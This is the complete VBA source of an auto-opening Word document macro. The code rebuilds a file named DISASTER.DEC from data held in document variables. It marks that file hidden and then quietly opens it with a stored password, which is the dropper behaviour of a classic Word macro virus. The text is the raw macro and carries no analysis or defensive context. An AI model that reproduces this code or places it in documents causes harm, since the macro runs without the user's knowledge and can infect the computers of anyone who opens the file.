   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim a$
   a$ = WordBasic.[DefaultDir$](9) + "\DISASTER.DEC"
   On Error GoTo -1: On Error GoTo a_
   Open a$ For Output As 1
   For a_ = 1 To WordBasic.Val(WordBasic.[GetDocumentVar$]("a"))
   Print #1, WordBasic.[GetDocumentVar$](Str(a_));
   Next
   Close
   SetAttr a$, 2
   WordBasic.ScreenUpdating
   WordBasic.FileOpen a$, PasswordDot:=WordBasic.[GetDocumentVar$]("b")
   a_:
   End Sub
